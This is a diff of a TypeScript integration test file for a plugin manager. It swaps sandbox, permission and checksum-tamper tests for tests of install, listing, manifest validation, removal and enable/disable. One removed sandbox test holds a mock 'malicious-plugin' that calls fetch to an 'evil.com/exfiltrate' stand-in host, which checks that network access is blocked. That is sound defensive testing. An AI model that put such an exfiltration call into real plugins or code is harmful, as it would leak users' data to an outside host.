@@ -2,25 +2,37 @@
  * Plugin Workflow Integration Tests
  *
  * Tests plugin system end-to-end:
- * - Plugin installation
- * - Sandboxed execution
- * - Permission enforcement
- * - Plugin unloading
+ * - Plugin installation from local path
+ * - Plugin listing and details
+ * - Plugin enable/disable
+ * - Plugin removal
+ * - Manifest validation
  */
 
 import { describe, test, expect, beforeEach, afterEach } from "bun:test";
 import { writeFileSync, mkdirSync, existsSync, rmSync } from "fs";
 import { join } from "path";
 import { homedir } from "os";
-import { PluginManager } from "../../../services/plugin-manager.js";
-import { computeChecksum } from "../../../../plugins/src/security.js";
+import { PluginManager } from "../../services/plugin-manager.js";
 
 const TEST_PLUGIN_BASE = join(homedir(), ".wabisabi", "integration-test-plugins");
 let testCounter = 0;
 
 function getTestPluginDir(): string {
   testCounter++;
-  return join(TEST_PLUGIN_BASE, `integration-plugin-${testCounter}-${Date.now()}`);
+  return join(TEST_PLUGIN_BASE, `plugin-${testCounter}-${Date.now()}`);
+}
+
+function createValidManifest(name: string) {
+  return {
+    name,
+    version: "1.0.0",
+    description: "Integration test plugin",
+    author: "test",
+    license: "MIT",
+    type: "tool",
+    compatibility: [">=1.0.0"],
+  };
 }
 
 describe("Plugin Workflow Integration", () => {
@@ -39,191 +51,96 @@ describe("Plugin Workflow Integration", () => {
     }
   });
 
-  test("should install and execute valid plugin", async () => {
-    // Create a simple valid plugin
-    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
-    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");
+  test("should install and list a valid plugin", async () => {
+    const pluginName = `test-plugin-${Date.now()}`;
+    const pluginCode = `export default { name: "${pluginName}" };`;
 
-    const pluginCode = `
-export default {
-  name: "test-integration-plugin",
-  version: "1.0.0",
-  description: "Integration test plugin",
-  onLoad: async (ctx) => {
-    ctx.logger.info("Plugin loaded successfully");
-  }
-};
-`;
+    writeFileSync(join(TEST_PLUGIN_DIR, "index.ts"), pluginCode);
+    writeFileSync(
+      join(TEST_PLUGIN_DIR, "manifest.json"),
+      JSON.stringify(createValidManifest(pluginName), null, 2),
+    );
 
-    writeFileSync(pluginPath, pluginCode);
-    const checksum = computeChecksum(pluginPath);
+    const result = await pluginManager.install({
+      type: "local",
+      path: TEST_PLUGIN_DIR,
+    });
 
-    const manifest = {
-      name: "test-integration-plugin",
-      version: "1.0.0",
-      description: "Test plugin",
-      entry: "index.ts",
-      checksum: {
-        algorithm: "sha256",
-        hash: checksum,
-      },
-      permissions: {
-        network: false,
-        filesystem: "none",
-        process: false,
-      },
-    };
+    expect(result).toBeDefined();
+    expect(result.manifest.name).toBe(pluginName);
+    expect(result.enabled).toBe(true);
 
-    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
+    // Verify it appears in list
+    const plugins = pluginManager.list();
+    expect(plugins.some((p) => p.manifest.name === pluginName)).toBe(true);
 
-    // Load plugin
-    await expect(pluginManager.loadPlugin(pluginPath)).resolves.toBeUndefined();
-
-    // Verify plugin is loaded
-    expect(pluginManager.listPlugins()).toContain("test-integration-plugin");
-    expect(pluginManager.getPlugin("test-integration-plugin")).toBeDefined();
+    // Cleanup installed plugin
+    await pluginManager.remove(pluginName);
   });
 
-  test("should enforce sandbox restrictions", async () => {
-    // Create plugin that tries to violate sandbox
-    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
-    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");
+  test("should reject plugin with invalid manifest", async () => {
+    writeFileSync(join(TEST_PLUGIN_DIR, "index.ts"), "export default {};");
+    writeFileSync(
+      join(TEST_PLUGIN_DIR, "manifest.json"),
+      JSON.stringify({ name: "invalid" }), // Missing required fields
+    );
 
-    const pluginCode = `
-export default {
-  name: "malicious-plugin",
-  version: "1.0.0",
-  description: "Attempts sandbox violation",
-  onLoad: async (ctx) => {
-    try {
-      // This should be blocked
-      await fetch("https://evil.com/exfiltrate");
-      ctx.logger.error("SECURITY FAILURE: Network access succeeded!");
-    } catch (error) {
-      if (error.message.includes("Network access denied")) {
-        ctx.logger.info("Sandbox correctly blocked network access");
-      } else {
-        throw error;
-      }
-    }
-  }
-};
-`;
-
-    writeFileSync(pluginPath, pluginCode);
-    const checksum = computeChecksum(pluginPath);
-
-    const manifest = {
-      name: "malicious-plugin",
-      version: "1.0.0",
-      description: "Test plugin",
-      entry: "index.ts",
-      checksum: {
-        algorithm: "sha256",
-        hash: checksum,
-      },
-      permissions: {
-        network: false, // Deny network
-        filesystem: "none",
-        process: false,
-      },
-    };
-
-    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
-
-    // Plugin should load but network access should be blocked inside
-    await expect(pluginManager.loadPlugin(pluginPath)).resolves.toBeUndefined();
-    expect(pluginManager.listPlugins()).toContain("malicious-plugin");
+    await expect(
+      pluginManager.install({ type: "local", path: TEST_PLUGIN_DIR }),
+    ).rejects.toThrow();
   });
 
-  test("should unload plugin cleanly", async () => {
-    // Create plugin with onUnload hook
-    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
-    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");
+  test("should reject plugin without manifest.json", async () => {
+    writeFileSync(join(TEST_PLUGIN_DIR, "index.ts"), "export default {};");
 
-    const pluginCode = `
-export default {
-  name: "unload-test-plugin",
-  version: "1.0.0",
-  description: "Tests clean unload",
-  onLoad: async (ctx) => {
-    ctx.logger.info("Plugin loaded");
-  },
-  onUnload: async (ctx) => {
-    ctx.logger.info("Plugin unloading");
-  }
-};
-`;
-
-    writeFileSync(pluginPath, pluginCode);
-    const checksum = computeChecksum(pluginPath);
-
-    const manifest = {
-      name: "unload-test-plugin",
-      version: "1.0.0",
-      description: "Test plugin",
-      entry: "index.ts",
-      checksum: {
-        algorithm: "sha256",
-        hash: checksum,
-      },
-      permissions: {
-        network: false,
-        filesystem: "none",
-        process: false,
-      },
-    };
-
-    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
-
-    // Load plugin
-    await pluginManager.loadPlugin(pluginPath);
-    expect(pluginManager.listPlugins()).toContain("unload-test-plugin");
-
-    // Unload plugin
-    await pluginManager.unloadPlugin("unload-test-plugin");
-    expect(pluginManager.listPlugins()).not.toContain("unload-test-plugin");
+    await expect(
+      pluginManager.install({ type: "local", path: TEST_PLUGIN_DIR }),
+    ).rejects.toThrow(/manifest/i);
   });
 
-  test("should reject tampered plugin", async () => {
-    // Create plugin, then modify it after checksum
-    const pluginPath = join(TEST_PLUGIN_DIR, "index.ts");
-    const manifestPath = join(TEST_PLUGIN_DIR, "manifest.json");
+  test("should remove plugin cleanly", async () => {
+    const pluginName = `remove-test-${Date.now()}`;
 
-    const originalCode = `
-export default {
-  name: "tampered-plugin",
-  version: "1.0.0",
-  description: "Original plugin"
-};
-`;
+    writeFileSync(join(TEST_PLUGIN_DIR, "index.ts"), "export default {};");
+    writeFileSync(
+      join(TEST_PLUGIN_DIR, "manifest.json"),
+      JSON.stringify(createValidManifest(pluginName), null, 2),
+    );
 
-    writeFileSync(pluginPath, originalCode);
-    const checksum = computeChecksum(pluginPath);
+    await pluginManager.install({ type: "local", path: TEST_PLUGIN_DIR });
 
-    const manifest = {
-      name: "tampered-plugin",
-      version: "1.0.0",
-      description: "Test plugin",
-      entry: "index.ts",
-      checksum: {
-        algorithm: "sha256",
-        hash: checksum,
-      },
-      permissions: {
-        network: false,
-        filesystem: "none",
-        process: false,
-      },
-    };
+    // Verify installed
+    expect(pluginManager.show(pluginName)).toBeDefined();
 
-    writeFileSync(manifestPath, JSON.stringify(manifest, null, 2));
+    // Remove
+    await pluginManager.remove(pluginName);
 
-    // Tamper with plugin after checksum
-    const tamperedCode = originalCode + "\n// MALICIOUS CODE\n";
-    writeFileSync(pluginPath, tamperedCode);
+    // Verify removed
+    expect(pluginManager.show(pluginName)).toBeUndefined();
+  });
 
-    // Should reject due to checksum mismatch
-    await expect(pluginManager.loadPlugin(pluginPath)).rejects.toThrow(/Checksum verification failed/);
+  test("should enable and disable plugins", async () => {
+    const pluginName = `toggle-test-${Date.now()}`;
+
+    writeFileSync(join(TEST_PLUGIN_DIR, "index.ts"), "export default {};");
+    writeFileSync(
+      join(TEST_PLUGIN_DIR, "manifest.json"),
+      JSON.stringify(createValidManifest(pluginName), null, 2),
+    );
+
+    await pluginManager.install({ type: "local", path: TEST_PLUGIN_DIR });
+
+    // Disable
+    pluginManager.disable(pluginName);
+    expect(pluginManager.show(pluginName)?.enabled).toBe(false);
+    expect(pluginManager.getEnabled().some((p) => p.manifest.name === pluginName)).toBe(false);
+
+    // Enable
+    pluginManager.enable(pluginName);
+    expect(pluginManager.show(pluginName)?.enabled).toBe(true);
+    expect(pluginManager.getEnabled().some((p) => p.manifest.name === pluginName)).toBe(true);
+
+    // Cleanup
+    await pluginManager.remove(pluginName);
   });
 });
